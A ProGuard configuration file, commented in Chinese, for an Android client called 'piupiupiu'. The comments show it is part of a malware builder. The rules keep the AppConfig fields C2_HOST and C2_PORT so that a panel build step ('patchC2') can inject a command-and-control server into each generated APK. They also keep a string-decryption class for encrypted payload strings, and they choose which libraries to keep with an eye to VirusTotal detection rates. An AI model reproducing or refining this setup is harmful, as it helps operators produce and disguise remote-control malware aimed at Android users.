# ---------------------------------------------------------------
# piupiupiu 客户端 ProGuard 规则
# 目标：压缩(shrink)+改名(obfuscate)，同时保证面板 Build 的 patchC2 仍能注入 C2。
# ---------------------------------------------------------------

# 1) 必须保留 AppConfig：面板 Build 的 patchC2 按「类名 AppConfig + 字段 C2_HOST/C2_PORT +
#    c2Base() 折叠出的明文 URL」做正则注入。改名后这些锚点一旦消失，生成 APK 就改不了 C2。
#    { public *; } 保留类内所有 public 成员名（字段/方法），方法体仍会被混淆/优化。
-keep class com.piupiupiu.AppConfig { public *; }

# 2) 字符串解密工具 StrCodec：显式保留 dec 方法，确保解密调用与密文 blob 留在调用处常量池。
-keep class com.piupiupiu.StrCodec { public static java.lang.String dec(java.lang.String); }

# 3) 四大组件：虽然 AGP 会按清单自动生成保留规则，这里再显式保一层，防万一。
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.app.Application

# 4) 保留 @Keep 注解的成员（若有）
-keep @android.support.annotation.Keep class * { *; }
-keepclasseswithmembers class * { @android.support.annotation.Keep <methods>; }

# 5) okhttp3 / okio：保留整体，避免其内部 Class.forName 探测平台在混淆后失效。
#    （正常 app 里 okhttp 极常见，保留它对 VT 无负面影响，收益/风险比最优。）
-keep class okhttp3.** { *; }
-keep class okio.** { *; }
-dontwarn okhttp3.**
-dontwarn okio.**
-dontwarn com.squareup.okhttp.**
-keepattributes *Annotation*,Signature
-keepclassmembers class * implements java.io.Serializable { *; }
-keepclassmembers enum * { *; }
